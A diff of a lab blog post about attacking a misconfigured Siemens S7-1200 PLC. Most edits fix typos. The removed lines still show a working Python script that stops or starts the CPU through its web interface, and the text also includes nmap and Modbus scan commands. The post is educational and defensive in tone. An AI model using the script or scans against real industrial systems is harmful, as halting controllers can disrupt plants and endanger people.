@@ -1,9 +1,9 @@
 ---
 layout: post
-title: "Attacking the SIEMENS S7-1200 PLC (OT Security Lab Pt. 7)"
+title: "Attacking the Siemens S7-1200 PLC (OT Security Lab Pt. 7)"
 subtitle: "Hacking PLCs for fun and for profit!"
 date: 2026-09-23
-description: "Looking at different attack vectors for the SIEMEN S7-1200 PLC CPU and how they can be exploited."
+description: "Looking at different attack vectors for the Siemens S7-1200 PLC CPU and how they can be exploited."
 --- 
 
 - [Goals](#goals)
@@ -20,18 +20,18 @@ description: "Looking at different attack vectors for the SIEMEN S7-1200 PLC CPU
 - [Final Thoughts](#final-thoughts)
 
 ## Goals
-- Scan our PLC to see what we can learn
-- Attack the different protocols exposed by the PLC
+1. Scan our PLC to see what we can learn
+2. Attack the different protocols exposed by the PLC
 
 
-I'll note at the start, we won't cover every aspect of attacking an S7-1200. I'm ignoring SNMP entirely, as well as exploits agaisnt the device itself, for the following reasons:
+I'll note at the start, we won't cover every aspect of attacking an S7-1200. I'm ignoring SNMP entirely, as well as exploits against the device itself, for the following reasons:
 1. I didn't want to have to downgrade/upgrade the PLC firmware to get to vulnerable versions
 2. I didn't find the SNMP risks that interesting
 3. I wanted to focus on the 'flashier' attacks instead
 
 I do intend to do a much more indepth analysis at some point, looking at past CVEs and more technical attacks
 
-**The techniques discussed in this article should only be conducted agaisnt systems you personally own or have explicit permission to test against.**
+**The techniques discussed in this article should only be conducted against systems you personally own or have explicit permission to test against.**
 
 ## Scanning
 What is network scanning without Nmap? Let's look at a few different scans we can run, and the result we get back.
@@ -72,7 +72,7 @@ PORT     STATE    SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 712.71 seconds
 ```
-That's better. Now we're getting that we expect.
+That's better. Now we're getting what we expect.
 
 ### Service Scan
 Now we'll try and get some more details on the services. I've filtered the ports based on the last scan for the sake of time.
@@ -124,7 +124,7 @@ Service Info: Device: specialized
 Nmap done: 1 IP address (1 host up) scanned in 31.03 seconds
 ```
 
-A hardware and firmware number is a good result. The firmware version could be used to begin to identify what exploits might work agaisnt the device.
+A hardware and firmware number is a good result. The firmware version could be used to begin to identify what exploits might work against the device.
 
 We'll try [Modbus Discovery](https://nmap.org/nsedoc/scripts/modbus-discover.html) next.
 `nmap -Pn 10.0.0.10 --script modbus-discover.nse --script-args='modbus-discover.aggressive=true' -p 502`
@@ -224,53 +224,11 @@ Not much of any use to us.
 ### HTTP
 Lets check out the web service running on the PLC. I've configured it to be as insecure as possible.
 
-When we first access the webpage, we land on the 'Start Page' where we are immediatly tempted by the big 'STOP' button. And if we click it...
+When we first access the webpage, we land on the 'Start Page' where we are immediately tempted by the big 'STOP' button. And if we click it...
 
 ![switching off the plc from the web](/blog/res/ot-lab-plc-web-off.gif)
 
-Easy as that! We can even script it with a bit of python:
-
-``` python
-#!/usr/bin/env python3
-"""
-Usage:
-    python3 cpu_command.py Run 10.0.0.10
-    python3 cpu_command.py Stop 10.0.0.10
-"""
-
-import sys
-import requests
-
-def send_command(command: str, ip_address: str, port: int = 80, timeout: int = 5):
-    url = f"http://{ip_address}/CPUCommands"
-    payload = {command: 1,"PriNav":"Start"}
-    headers = {"Referer": f"http://{ip_address}/"}    
-    try:
-        response = requests.post(url, data=payload, timeout=timeout,headers=headers)
-        response.raise_for_status()
-        print(f"Sent '{command}' to {ip_address} - status: {response.status_code}")
-        return response
-    except requests.exceptions.RequestException as e:
-        print(f"Request failed: {e}")
-        return None
-
-def main():
-    if len(sys.argv) != 3:
-        print(f"Usage: {sys.argv[0]} <Run|Stop> <ip_address>")
-        sys.exit(1)
-
-    command = sys.argv[1].capitalize()
-    ip_address = sys.argv[2]
-
-    if command not in ("Run", "Stop"):
-        print("Error: command must be 'Run' or 'Stop'")
-        sys.exit(1)
-
-    send_command(command, ip_address)
-
-if __name__ == "__main__":
-    main()
-```
+Easy as that - I even scripted it with a bit of python!
 
 ![switching the cpu on and off using the python script](/blog/res/ot-lab-plc-http-off-on.gif)
 
@@ -283,7 +241,7 @@ We can also snoop around the webpage to do some data gathering while we're here.
 - Any Uploaded Files (including recipes)
 - and so much more!
 
-Now it's time to make a over-the-top article online about how insecure PLCs are and how hackers are going to hack them all and blow up every factory and destroy the world!!!!!!!!!!!
+Now it's time to make an over-the-top article online about how insecure PLCs are and how hackers are going to hack them all and blow up every factory and destroy the world!!!!!!!!!!!
 
 But lets put it in context:
 - Web access can be disabled, and often times is.
@@ -300,10 +258,12 @@ Using [this](https://github.com/tijldeneut/ICSSecurityScripts/blob/master/S7-120
 
 **However, a caveat.** For the above demo, I put a blank project onto the PLC - removing all the ladder logic I'd be using before. I did this because, when my ladder logic was loaded, this attack didn't actually work. This is because the ladder logic instantly overwrote the adhoc input, nullifying the attack. 
 
-**This is a good point to remind you that articles like this, and many, many others, do not always reflect the reality of risk on site.** Yes, OT sites are filled with unpatched devices, ancient operating systems, and bad network segmentation, but they are also extremly complex in their own right, with things like ladder logic and saftey systems that are not understood at all by folk in IT, or more traditional cyber security. Therefore, don't always let yourself be taken in by flashy attacks like the above. Just because something looks crazy in a video, doesn't mean it would have the same impact in the real world.
+**This is a good point to remind you that articles like this, and many, many others, do not always reflect the reality of risk on site.** Yes, OT sites are filled with unpatched devices, ancient operating systems, and bad network segmentation, but they are also extremely complex in their own right, with things like ladder logic and safety systems that are not understood at all by folk in IT, or more traditional cyber security. Therefore, don't always let yourself be taken in by flashy attacks like the above. Just because something looks crazy in a video, doesn't mean it would have the same impact in the real world.
 
 ### OPC-UA
 We dove deeper into OPC-UA in a previous article where we looked at how bad authentication practice could lead to tags being written to by strangers. Check if out [here](https://cdino.net/blog/2026/ot-lab-opc-ua-scanner) to see more.
+
+[Claroty](https://www.claroty.com/team82/research/opc-ua-deep-dive-a-complete-guide-to-the-opc-ua-attack-surface) actually have a really good deep dive into OPC-UA security that I'd suggest you check out it you want to dive deeper.
 
 ### Modbus
 Plain old TCP Modbus is about as insecure as you can get. Within the Modbus Protocol specification, there is no:
@@ -313,9 +273,9 @@ Plain old TCP Modbus is about as insecure as you can get. Within the Modbus Prot
 - Integrity Checks
 - Replay Protection
 
-This makes Modbus quite a vulnerable protocol to run in your environment. This risk is naturally reduced due to defense in depth - with modbus traffic not usually coming past Purdue level 2, but if an attacker got that deep into your environment (or came in through the backdoor!) they can have a lot of fun playing with Modbus.
+This makes Modbus quite a vulnerable protocol to run in your environment. This risk is naturally reduced due to defence in depth - with modbus traffic not usually coming past Purdue level 2, but if an attacker got that deep into your environment (or came in through the backdoor!) they can have a lot of fun playing with Modbus.
 
 We could try a few different attacks here, but I want to focus on a MITM tampering attack. It's a slightly complex attack, so I'll be dedicating a whole article to it. We'll also look at a tool I made to help pull it off.
 
 ## Final Thoughts
-We've taken a brief look at a few different attack vectors that an S7-1200 can expose. 
+We've taken a brief look at a few different attack vectors that an S7-1200 can expose. One thing worth noting is that, as mentioned at the top of the page, we didn't actually exploit any CVEs, or technical vulnerabilities. All these attacks were possible because of misconfigurations made on the device. Misconfigurations that made the device much easier to set up and manage, but left it wide open to abuse. Everything we took advantage of worked exactly as it should have, it just shouldn't have been available to us. This emphasises the importance of a) proper network segmentation and b) device hardening to decrease the attack surface. This is what we'll look at next in the defend portion.
